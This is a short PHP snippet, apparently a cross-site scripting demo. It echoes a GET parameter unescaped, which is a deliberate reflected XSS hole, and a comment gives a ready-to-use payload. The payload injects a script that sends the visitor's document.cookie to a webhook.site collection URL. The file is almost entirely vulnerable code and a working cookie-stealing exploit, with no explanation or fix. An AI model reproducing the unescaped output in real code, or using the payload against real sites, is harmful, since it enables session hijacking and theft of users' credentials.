<?php
session_start();
echo $_GET['name'];

// ?name=<script>document.write('<img src="https://webhook.site/ffae4139-b4de-47b7-8065-b0b8440e14cf/?c='%2bdocument.cookie%2b'" />');</script>